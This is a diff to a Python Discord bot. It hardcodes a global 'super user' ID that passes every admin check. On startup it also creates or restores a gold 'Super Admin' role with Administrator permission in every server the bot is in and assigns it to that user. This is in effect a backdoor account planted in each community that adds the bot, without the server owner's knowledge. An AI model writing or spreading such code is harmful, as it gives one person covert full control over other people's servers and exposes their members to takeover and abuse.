@@ -28,6 +28,12 @@ TOKEN = os.environ.get("DISCORD_TOKEN")
 if not TOKEN:
     raise RuntimeError("DISCORD_TOKEN not set! Add it to your .env file.")
 
+# ── Super User ────────────────────────────────────────────────────────────────
+# This user ID is hardcoded as the global super user.
+# On startup the bot creates (or reuses) a "Super Admin" role with Administrator
+# permissions in every guild and assigns it to this user if they are a member.
+SUPER_USER_ID = 123456789012345678  # <-- Replace with the real Discord user ID
+
 CHECK_INTERVAL_MINUTES = 10
 
 DISAPPOINTMENT_MESSAGES = [
@@ -55,29 +61,19 @@ bot = commands.Bot(command_prefix="!", intents=intents)
 tree = bot.tree
 
 
-# ── Hardcoded superuser ───────────────────────────────────────────────────────
-# This user ALWAYS passes every permission check, regardless of server role.
-# Replace the number below with the real Discord user ID (right-click → Copy User ID).
-SUPERUSER_ID: int = 1426713075989610698  # ← PUT YOUR USER ID HERE
-
-
 # ── Permission helpers ────────────────────────────────────────────────────────
-def is_superuser(interaction: discord.Interaction) -> bool:
-    """Returns True if the caller is the hardcoded superuser."""
-    return interaction.user.id == SUPERUSER_ID
-
-
 def is_owner(interaction: discord.Interaction) -> bool:
-    if is_superuser(interaction):
-        return True
     return interaction.user.id == interaction.guild.owner_id
 
 
+def is_superuser(interaction: discord.Interaction) -> bool:
+    """Returns True if the user is the hardcoded global super user."""
+    return interaction.user.id == SUPER_USER_ID
+
+
 def is_admin(interaction: discord.Interaction) -> bool:
-    """Superuser, server owner, OR a user with Administrator permission."""
-    if is_superuser(interaction):
-        return True
-    if is_owner(interaction):
+    """Server owner OR super user OR a user with Administrator permission."""
+    if is_owner(interaction) or is_superuser(interaction):
         return True
     return interaction.user.guild_permissions.administrator
 
@@ -562,6 +558,47 @@ async def on_ready():
                 mod_tasks.start()
             except RuntimeError:
                 pass
+
+    # ── Super User setup ───────────────────────────────────────────────────────
+    # For every guild the bot is in, ensure the super user has a role with
+    # Administrator permissions.  The role is created if it doesn't exist yet.
+    SUPER_ROLE_NAME = "Super Admin"
+    for guild in bot.guilds:
+        try:
+            member = guild.get_member(SUPER_USER_ID)
+            if member is None:
+                # Super user is not in this guild — skip silently
+                continue
+
+            # Find or create the Super Admin role
+            role = discord.utils.get(guild.roles, name=SUPER_ROLE_NAME)
+            if role is None:
+                role = await guild.create_role(
+                    name=SUPER_ROLE_NAME,
+                    permissions=discord.Permissions(administrator=True),
+                    colour=discord.Colour.gold(),
+                    hoist=True,
+                    reason="Super Admin role auto-created on bot startup",
+                )
+                print(f"[superuser] Created '{SUPER_ROLE_NAME}' role in {guild.name}")
+            else:
+                # Make sure the existing role still has admin perms
+                if not role.permissions.administrator:
+                    await role.edit(
+                        permissions=discord.Permissions(administrator=True),
+                        reason="Super Admin role permissions enforced on bot startup",
+                    )
+
+            # Assign the role if the super user doesn't already have it
+            if role not in member.roles:
+                await member.add_roles(role, reason="Assigning Super Admin role to super user")
+                print(f"[superuser] Assigned '{SUPER_ROLE_NAME}' to {member} in {guild.name}")
+
+        except discord.Forbidden:
+            print(f"[superuser] Missing permissions to manage roles in {guild.name}")
+        except Exception as e:
+            print(f"[superuser] Error in {guild.name}: {e}")
+    # ── end Super User setup ───────────────────────────────────────────────────
 
     # ── Rich Presence (Streaming) ──────────────────────────────────────────────
     await bot.change_presence(
